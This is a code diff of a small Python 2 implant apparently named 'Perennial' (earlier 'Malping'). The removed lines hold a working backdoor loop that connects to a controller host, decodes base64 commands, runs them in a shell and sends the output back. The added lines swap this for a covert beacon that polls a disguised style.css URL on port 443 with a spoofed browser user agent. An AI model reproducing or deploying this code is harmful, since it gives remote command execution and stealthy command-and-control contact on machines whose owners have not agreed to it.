@@ -2,14 +2,14 @@
 
 import sys
 import time
-import socket
-import base64
-import datetime
+import urllib2
 import argparse
-import subprocess
 import logging as log
+from datetime import datetime
 
 SIZE = 1024
+UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
+
 
 def get_args():
     """ Parse arguments and return dictionary. """
@@ -22,6 +22,18 @@ def get_args():
     return parser.parse_args()
 
 
+def is_active(host, port):
+    try:
+        url = 'http://{}:{}/style.css'.format(host, port)
+        req = urllib2.Request(url, headers={'User-Agent': UA})
+        f = urllib2.urlopen(req)
+        if f.code == 200:
+            return True
+    except urllib2.URLError:
+        pass
+    return False
+
+
 def main():
     args = get_args()
 
@@ -32,30 +44,20 @@ def main():
 
     DELAY = args.delay
     HOST = args.host
-    PORT = int(args.port) if args.port else 80
+    PORT = int(args.port) if args.port else 443
 
     log.info(('[+] Perennial started with delay of {} seconds to port {}.' +
               ' Ctrl-c to exit.').format(DELAY, PORT))
 
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            try:
-                s.connect((HOST, PORT))
-                cmd = base64.b64decode(s.recv(SIZE))
-                log.info('[+] ({}) Executing "{}"'.format(datetime.datetime.now(),
-                                                          cmd))
-                stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE,
-                                          shell=True).communicate()[0]
-                response = base64.b64encode(stdout)
-                s.send(response)
-            except socket.error:
-                log.info(('[!] ({}) Could not connect to server.' +
-                          ' Waiting...').format(datetime.datetime.now()))
-            finally:
-                time.sleep(DELAY)
+            if is_active(HOST, PORT):
+                log.info('[+] ({}) Server is active'.format(datetime.now()))
+            else:
+                log.info('[!] ({}) Server is inactive'.format(datetime.now()))
+            time.sleep(DELAY)
         except KeyboardInterrupt:
-            log.info('[-] Malping terminated.')
+            log.info('[-] Perennial terminated.')
             sys.exit(0)
 
 if __name__ == '__main__':
